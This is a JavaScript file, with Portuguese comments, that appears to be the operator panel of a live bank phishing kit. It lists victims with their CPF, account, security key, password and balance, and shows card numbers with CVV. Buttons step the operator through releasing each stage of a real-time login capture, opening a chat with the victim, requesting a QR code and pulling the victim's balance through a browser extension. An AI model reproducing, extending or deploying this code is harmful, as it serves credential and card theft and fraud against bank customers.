/* =========================================================
    1. TEMA CLARO / ESCURO
   ========================================================= */
function initializeThemeToggle() {
    ['themeToggle', 'themeToggleMobile'].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        el.addEventListener('change', e => {
            document.body.classList.toggle('light-mode', e.target.checked);
            ['themeToggle', 'themeToggleMobile'].forEach(x => {
                const o = document.getElementById(x);
                if (o) o.checked = e.target.checked;
            });
        });
    });
}

/* =========================================================
    2. SINCRONIZAÇÃO DE FILTROS
   ========================================================= */
function syncAndFilter(sourceId, targetId, eventType) {
    const sourceEl = document.getElementById(sourceId);
    const targetEl = document.getElementById(targetId);
    if (sourceEl && targetEl) {
        sourceEl.addEventListener(eventType, () => {
            targetEl.value = sourceEl.value;
            carregarNovosDados();
        });
    }
}

/* =========================================================
    3. ATUALIZAÇÃO DE DADOS DO CLIENTE (VIA FETCH) - ✅ MODIFICADO
   ========================================================= */
// A função foi renomeada para refletir que pode atualizar mais do que apenas o status.
// Aceita um terceiro parâmetro 'tipo' opcional.
function updateClientData(clientId, newStatus, tipo, buttonElement) {
    if (buttonElement) {
        buttonElement.disabled = true; // Desativa o botão para evitar cliques duplos
    }

    const formData = new FormData();
    formData.append('id', clientId);
    formData.append('status', newStatus); // Enviando o parâmetro 'status'

    // Adiciona o tipo à requisição, se ele for fornecido
    if (tipo) {
        formData.append('tipo', tipo);
    }

    fetch('change_status.php', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            return response.text().then(text => { throw new Error(text || 'Erro no servidor') });
        }
    })
    .then(() => {
        console.log(`Dados do cliente #${clientId} atualizados.`);
        carregarNovosDados(); // Recarrega os dados para refletir a mudança
    })
    .catch(error => {
        console.error('Falha ao atualizar dados:', error);
        alert(`Erro ao tentar atualizar os dados: ${error.message}`);
        if (buttonElement) {
            buttonElement.disabled = false; // Reabilita o botão em caso de erro
        }
    });
}


/* =========================================================
    4. MAPA DE STATUS E FORMATAÇÕES
   ========================================================= */
const statusMap = {
    'guest': '🏠 Usuário na Home',
    'chat': '💬 Usuário no chat',
    'pending': '🕒 AG/CONTA fornecida, aguardando liberação.',
    'authorized': '📲 Liberado para Chave',
    'aguardando_key': '🔑 Chave fornecida, aguardando liberação para senha.',
    'key_authorized': '🔒 Liberado para Senha',
    'aguardando_password': '⌛ Senha fornecida, aguardando liberação final.',
    'password_authorized': '✅ Login autorizado.',
    'rejected': '❌ Usuário rejeitado.',
    'card_pending': '💳 Cartão informado'
};
function traduzirStatus(k) { return statusMap[k] || k; }

const estagioMap = {
    'index.php': '🏠 Página inicial.',
    'login-mobile.php': '🏠 Página inicial (Mobile).',
    'login.php': '🔑 Tela de chave/senha.',
    'logado.php': '💻 Tela logada (saldo/pix/etc).',
    'pix.php': '💸 Tela de PIX.',
    'chaveseg.php': '🛡️ Tela de chave de segurança.',
    'transferencias.php': '🔄 Tela de transferências.',
    'qrcodeted.php': '📲 Tela de QRCODE/Chave.',
    'cartoes.php': '💳 Tela de cartões.',
    'dadoscartao.php': '📝 Tela de dados do cartão.',
    'saldos.php': '📊 Tela de saldo e extratos.',
};
function traduzirEstagio(k) { return estagioMap[k] || k || 'N/A'; }

function formatarCPF(cpf) {
    if (!cpf) return 'N/A';
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function formatarTelefone(t) {
    if (!t) return 'N/A';
    if (t.length === 11) return t.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    return t;
}

/* =========================================================
    5. CRIAÇÃO DE CARDS DE CLIENTE - ✅ MODIFICADO
   ========================================================= */
function criarCard(cli) {
    const col = document.createElement('div');
    col.className = 'card-cliente cliente-card';
    col.dataset.nome   = (cli.nome || '').toLowerCase();
    col.dataset.status = cli.status;
    col.dataset.id     = cli.id;

    const statusTraduzido  = traduzirStatus(cli.status);
    const estagioTraduzido = traduzirEstagio(cli.status_estagio);

    let statusClass = 'offline', statusTitle = 'Cliente offline';
    if (cli.last_active_at) {
        const lastSeen = new Date(cli.last_active_at.replace(' ', 'T') + 'Z');
        if ((Date.now() - lastSeen.getTime()) / 1000 < 20) {
            statusClass = 'online';
            statusTitle = 'Cliente online';
        }
    }
    const statusIndicatorHTML = `<span class="status-indicator ${statusClass}" title="${statusTitle}"></span>`;

    const icons = {
        authorize: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>`,
        key:       `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M.5 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 9.5a.5.5 0 0 1-.354-.146L7.293 9.207l-.646.647a.5.5 0 0 1-.708 0L5.293 9.207l-.646.647a.5.5 0 0 1-.708 0L3.293 9.207l-.646.647a.5.5 0 0 1-.708 0L1.293 8.5H1a.5.5 0 0 1-.5-.5zM4 8a1 1 0 1 0-2 0 1 1 0 0 0 2 0z"/></svg>`,
        lock:      `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2zM5 9a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v5a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V9z"/></svg>`,
        reject:    `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z"/></svg>`,
        nome:      `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M12.146.146a.5.5 0 0 1 .708 0l3 3a.5.5 0 0 1 0 .708l-10 10a.5.5 0 0 1-.168.11l-5 2a.5.5 0 0 1-.65-.65l2-5a.5.5 0 0 1 .11-.168l10-10zM11.207 2.5 13.5 4.793 14.793 3.5 12.5 1.207 11.207 2.5zm1.586 3L10.5 3.207 4 9.707V10h.5a.5.5 0 0 1 .5.5v.5h.5a.5.5 0 0 1 .5.5v.5h.5a.5.5 0 0 1 .5.5v.5h.293l6.5-6.5zm-9.761 5.175-.106.106-1.528 3.821 3.821-1.528.106-.106A.5.5 0 0 1 5 12.5V12h-.5a.5.5 0 0 1-.5-.5V11h-.5a.5.5 0 0 1-.5-.5V10h-.5a.5.5 0 0 1-.5-.5V9h-.5a.5.5 0 0 1-.5-.5v-.293l.354.354a.5.5 0 0 1 0 .708l-2 2a.5.5 0 0 1-.708 0l-2-2a.5.5 0 0 1 .708-.708l2 2z"/></svg>`,
        saldo:     `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M1.5 4h13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0V5h-12v1.5a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 1.5 4z"/><path d="M14.5 7h-13a.5.5 0 0 0-.5.5v5a.5.5 0 0 0 .5.5h13a.5.5 0 0 0 .5-.5v-5a.5.5 0 0 0-.5-.5zM13 12H3V8h10v4z"/></svg>`,
        ref:       `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5 1a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2H5V1zm6 3H5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V5a1 1 0 0 0-1-1z"/></svg>`,
        qrcode:    `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M0 2a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V2zM7 1H1v6h6V1zm2 0h6v6H9V1zM1 9h6v6H1V9zm2-4h2v2H3V5zm10-2h-2v2h2V3zM3 11h2v2H3v-2zm6 0h2v2H9v-2z"/><path d="M7 5h2V3H7v2z"/></svg>`,
        card:      `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2-1a1 1 0 0 0-1 1v1h14V4a1 1 0 0 0-1-1H2zm13 4H1v5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V7z"/><path d="M2 10a1 1 0 0 1 1-1h1a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1v-1z"/></svg>`,
        chat:      `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M2.678 11.894a1 1 0 0 1 .287.801 10.97 10.97 0 0 1-.398 2c1.395-.323 2.247-.697 2.634-.893a1 1 0 0 1 .71-.074A8.06 8.06 0 0 0 8 14c3.996 0 7-2.582 7-5.5s-3.004-5.5-7-5.5-7 2.582-7 5.5c0 1.58.523 3.02 1.343 4.146.459.576.498 1.457.11 2.056z"/></svg>`,
        refresh:   `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2v1z"/><path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466z"/></svg>`,
        trash:     `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M2.5 1a1 1 0 0 0-1 1v1a1 1 0 0 0 1 1H3v9a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V4h.5a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H10a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1H2.5zm3 4a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7a.5.5 0 0 1 .5-.5zM8 5a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7A.5.5 0 0 1 8 5zm3 .5v7a.5.5 0 0 1-1 0v-7a.5.5 0 0 1 1 0z"/></svg>`
    };

    // Lógica para criar os botões de status condicionalmente
    let statusButtonsHTML = '';
    if (cli.status === 'pending') {
        // Se o cliente está pendente, mostra as opções de liberação por tipo
        statusButtonsHTML = `
            <div class="btn-group-vertical" role="group" aria-label="Opções de Liberação">
                <button class="btn-action status btn-tipo-classic" data-action="authorized" data-tipo="classic" data-id="${cli.id}" title="Liberar como Classic">${icons.key} <span>Classic</span></button>
                <button class="btn-action status btn-tipo-exclusive" data-action="authorized" data-tipo="exclusive" data-id="${cli.id}" title="Liberar como Exclusive">${icons.key} <span>Exclusive</span></button>
                <button class="btn-action status btn-tipo-prime" data-action="authorized" data-tipo="prime" data-id="${cli.id}" title="Liberar como Prime">${icons.key} <span>Prime</span></button>
            </div>
            <button class="btn-action status btn-rejeitar" data-action="rejected" data-id="${cli.id}" title="Negar Usuário">${icons.reject} <span>Negar</span></button>
        `;
    } else {
        // Para outros status, mostra os botões de liberação sequenciais
        statusButtonsHTML = `
            <button class="btn-action status" data-action="key_authorized" data-id="${cli.id}" title="Liberar para Senha">${icons.lock} <span>Liberar senha</span></button>
            <button class="btn-action status" data-action="password_authorized" data-id="${cli.id}" title="Liberar Login">${icons.authorize} <span>Liberar login</span></button>
            <button class="btn-action status" data-action="rejected" data-id="${cli.id}" title="Negar Usuário">${icons.reject} <span>Negar usuário</span></button>
        `;
    }

    const dataHoraSaoPaulo = new Date(cli.created_at)
        .toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
    const saldoFormatado = new Intl.NumberFormat('pt-BR', {
        style: 'currency', currency: 'BRL'
    }).format(cli.saldo != null ? cli.saldo : 0);

    const tipoLabel = cli.tipo
        ? cli.tipo.charAt(0).toUpperCase() + cli.tipo.slice(1)
        : '';
    const tipoFlagHTML = tipoLabel
        ? `<p><strong>Tipo:</strong> <span class="tipo-flag tipo-${cli.tipo}">${tipoLabel}</span></p>`
        : '';

    col.innerHTML = `
        <div class="card-cliente-header">
            <h6>Cliente #${cli.id}</h6>
            ${statusIndicatorHTML}
            <small>${dataHoraSaoPaulo}</small>
        </div>
        <div class="card-cliente-info">
            <p><strong>Nome:</strong> <span class="valor-nome" data-cliente-id="${cli.id}">${cli.nome || 'N/A'}</span></p>
            ${tipoFlagHTML}
            <p><strong>Ref. Dispositivo:</strong> <span class="valor-ref" data-cliente-id="${cli.id}">${cli.referencia_dispositivo || 'N/A'}</span></p>
            <p><strong>CPF:</strong> <span class="info">${formatarCPF(cli.cpf)}</span></p>
            <p><strong>Celular:</strong> <span class="info">${formatarTelefone(cli.telefone)}</span></p>
            <p><strong>Agência:</strong> <span class="info">${cli.agencia || 'N/A'}</span></p>
            <p><strong>Conta:</strong> <span class="info">${cli.conta || ''}-${cli.digito || ''}</span></p>
            <p><strong>Chave:</strong> <span class="info">${cli.chave || 'N/A'}</span></p>
            <p><strong>Senha:</strong> <span class="info">${cli.senha || 'N/A'}</span></p>
            <p><strong>Saldo:</strong> <span class="valor-saldo" data-cliente-id="${cli.id}">${saldoFormatado}</span></p>
            <p><strong>Status (Liberação):</strong> <span class="info">${statusTraduzido}</span></p>
            <p><strong>Estágio Atual:</strong> <span class="info">${estagioTraduzido}</span></p>
        </div>
        <div class="card-cliente-actions">
            <div class="actions-grid-status">${statusButtonsHTML}</div>
            <div class="actions-grid-update">
                <button class="btn-action update-nome btn-editar-nome" data-campo="nome" data-id="${cli.id}" data-valor="${cli.nome || ''}">${icons.nome} <span>Atualizar Nome</span></button>
                <button class="btn-action update-saldo btn-editar-saldo" data-campo="saldo" data-id="${cli.id}" data-valor="${cli.saldo ?? ''}">${icons.saldo} <span>Atualizar Saldo</span></button>
                <button class="btn-action update-ref btn-editar-ref" data-campo="referencia_dispositivo" data-id="${cli.id}" data-valor="${cli.referencia_dispositivo || ''}">${icons.ref} <span>Atualizar Ref.</span></button>
            </div>
            <div class="actions-grid-utility">
                <button class="btn-qrcode-card" data-qrcode-id="${cli.id}" title="Pedir QR Code">${icons.qrcode} <span>Pedir QR Code</span></button>
                ${cli.numero_cartao
                    ? `<button class="btn-action-secondary btn-mostrar-cartao" data-id="${cli.id}">${icons.card} <span>Dados Cartão</span></button>`
                    : '<div></div>'}
                <button class="btn-action chat btn-chat" data-cookie="${cli.identificador_cookie}">${icons.chat} <span>Chat Cliente</span></button>
            </div>
            <button class="btn-action btn-request-saldo" data-id="${cli.id}">
                ${icons.refresh} <span>Puxar Saldo/Extrato</span>
            </button>
            <form method="post" action="delete_client.php" onsubmit="return confirm('Confirma exclusão?');">
                <input type="hidden" name="id" value="${cli.id}">
                <button type="submit" class="btn-action delete" title="Excluir Cliente">${icons.trash} <span>Excluir Cliente</span></button>
            </form>
        </div>
    `;

    return col;
}


/* =========================================================
    6. POLLING DE CLIENTES
   ========================================================= */
window.__ULTIMOS_CLIENTES__ = [];

function carregarNovosDados() {
    const filtroStatusEl = document.getElementById('filterStatus');
    const filtroBuscaEl = document.getElementById('searchInput');
    const filtroStatus = filtroStatusEl ? filtroStatusEl.value : '';
    const filtroBusca = filtroBuscaEl ? filtroBuscaEl.value.toLowerCase() : '';

    fetch('/novos_dados.php')
        .then(r => r.ok ? r.json() : Promise.reject('Erro de rede'))
        .then(dados => {
            window.__ULTIMOS_CLIENTES__ = dados;
            const container = document.getElementById('cards-container');
            container.innerHTML = ''; // Limpa o container antes de adicionar os novos cards
            dados
                .filter(cli => {
                    const nomeCliente = (cli.nome ? cli.nome : '').toLowerCase();
                    const okStatus = !filtroStatus || cli.status === filtroStatus;
                    const okBusca = !filtroBusca || nomeCliente.includes(filtroBusca);
                    return okStatus && okBusca;
                })
                .forEach(cli => {
                    const card = criarCard(cli);
                    container.appendChild(card);
                });
        })
        .catch(console.error);
}

/* =========================================================
    7. DELEGAÇÃO DE EVENTOS E CONTROLE DE MODAIS - ✅ MODIFICADO
   ========================================================= */
let elementoFocoAnterior = null;

function abrirModalCartao(clienteId) {
    const cliente = window.__ULTIMOS_CLIENTES__.find(c => c.id == clienteId);
    if (!cliente) { alert('Cliente não encontrado.'); return; }
    const modal = document.getElementById('modal-dados-cartao');
    document.getElementById('modal-cartao-titulo').textContent = `Dados do Cartão - Cliente #${cliente.id}`;
    document.getElementById('modal-cartao-numero').textContent = cliente.numero_cartao;
    document.getElementById('modal-cartao-validade').textContent = cliente.validade_cartao;
    document.getElementById('modal-cartao-cvv').textContent = cliente.cvv_cartao;
    modal.style.display = 'block';
    modal.setAttribute('aria-hidden', 'false');
    modal.querySelector('.mq-close').focus();
}

function fecharModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
        modal.setAttribute('aria-hidden', 'true');
        if (elementoFocoAnterior) {
            elementoFocoAnterior.focus();
        }
    }
}

document.body.addEventListener('click', e => {
    // Handler para fechar modais
    const closeTrigger = e.target.closest('[data-close-modal]');
    if (closeTrigger) {
        fecharModal(closeTrigger.dataset.closeModal);
        return;
    }

    // Handler para os botões de AÇÃO DE STATUS
    const statusButton = e.target.closest('.btn-action.status');
    if (statusButton) {
        e.preventDefault();
        const newStatus = statusButton.dataset.action; // Pega o status de destino (ex: "authorized")
        const clientId = statusButton.dataset.id;
        // Pega o tipo do botão. Se o atributo não existir, será 'undefined'.
        const tipo = statusButton.dataset.tipo;

        // Chama a função centralizada, agora passando o 'tipo'
        updateClientData(clientId, newStatus, tipo, statusButton);
        return;
    }

    // Handler para botões de EDIÇÃO
    const bEditar = e.target.closest('.btn-editar-nome, .btn-editar-saldo, .btn-editar-ref');
    if (bEditar && typeof abrirModal === 'function') {
        elementoFocoAnterior = document.activeElement;
        abrirModal(bEditar.dataset.campo, bEditar.dataset.id, bEditar.dataset.valor);
        return;
    }

    // Handlers para outros botões...
    const btnCartao = e.target.closest('.btn-mostrar-cartao');
    if (btnCartao) {
        elementoFocoAnterior = document.activeElement;
        abrirModalCartao(btnCartao.dataset.id);
        return;
    }

    const btnQR = e.target.closest('.btn-qrcode-card');
    if (btnQR && typeof abrirModalQRCode === 'function') {
        elementoFocoAnterior = document.activeElement;
        abrirModalQRCode(btnQR.dataset.qrcodeId);
        return;
    }

    const chatBtn = e.target.closest('.btn-chat');
    if (chatBtn && typeof fetchAdminMessages === 'function') {
        elementoFocoAnterior = document.activeElement;
        window.chatCookie = chatBtn.dataset.cookie;
        window.chatLastId = 0;
        document.getElementById('admin-chat-window').innerHTML = '';
        new bootstrap.Offcanvas(document.getElementById('offcanvasChat')).show();
        fetchAdminMessages();
        return;
    }

    const btnSaldo = e.target.closest('.btn-request-saldo');
    if (btnSaldo) {
        elementoFocoAnterior = document.activeElement;
        const leadId = btnSaldo.dataset.id;
        const originalText = btnSaldo.innerHTML;
        btnSaldo.innerHTML = 'Buscando...';
        btnSaldo.disabled = true;

        if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.sendMessage) {
            alert("Função em desenvolvimento, aguarde por atualizações.");
            btnSaldo.innerHTML = originalText;
            btnSaldo.disabled = false;
            return;
        }

        chrome.runtime.sendMessage({
            action: "getSaldo",
            leadId: leadId
        }, (response) => {
            btnSaldo.innerHTML = originalText;
            btnSaldo.disabled = false;

            if (chrome.runtime.lastError) {
                alert("Erro ao comunicar com a extensão: " + chrome.runtime.lastError.message);
                console.error("Erro da extensão:", chrome.runtime.lastError.message);
                return;
            }

            if (response && response.success) {
                const dados = response.data;
                console.log("Dados recebidos da extensão:", dados);
                alert(`Dados capturados para Cliente #${leadId}!\nVerifique o console para mais detalhes.`);
            } else {
                const errorMsg = response ? response.error : "Sem resposta da extensão.";
                alert(`Não foi possível extrair os dados.\nErro: ${errorMsg}`);
                console.error("Erro retornado pela extensão:", errorMsg);
            }
        });
        return;
    }
});

/* =========================================================
    8. INICIALIZAÇÃO
   ========================================================= */
document.addEventListener('DOMContentLoaded', () => {
    initializeThemeToggle();
    syncAndFilter('filterStatus', 'filterStatusMobile', 'change');
    syncAndFilter('searchInput', 'searchInputMobile', 'input');
    syncAndFilter('filterStatusMobile', 'filterStatus', 'change');
    syncAndFilter('searchInputMobile', 'searchInput', 'input');

    carregarNovosDados();
    setInterval(carregarNovosDados, 5000); // Polling ajustado para 5 segundos
});